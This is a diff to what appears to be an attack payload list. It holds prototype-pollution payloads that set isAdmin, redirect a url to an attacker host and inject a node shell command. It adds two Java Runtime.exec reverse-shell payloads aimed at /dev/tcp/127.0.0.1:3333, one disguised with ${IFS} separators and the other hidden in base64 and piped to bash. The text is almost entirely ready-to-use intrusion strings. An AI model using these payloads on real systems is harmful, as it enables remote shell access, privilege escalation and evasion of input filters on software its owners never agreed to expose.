@@ -2,3 +2,5 @@
 {"__proto__": {"url": "http://attacker-controlled.com"}}
 ?__proto__[isAdmin]=true
 {"__proto__": {"shell": "node -e 'malicious_code'"}}
+Runtime.getRuntime().exec("/bin/bash -c bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/3333${IFS}0>&1");
+Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS8zMzMzMD4mMQ==}|{base64,-d}|{bash,-i}");
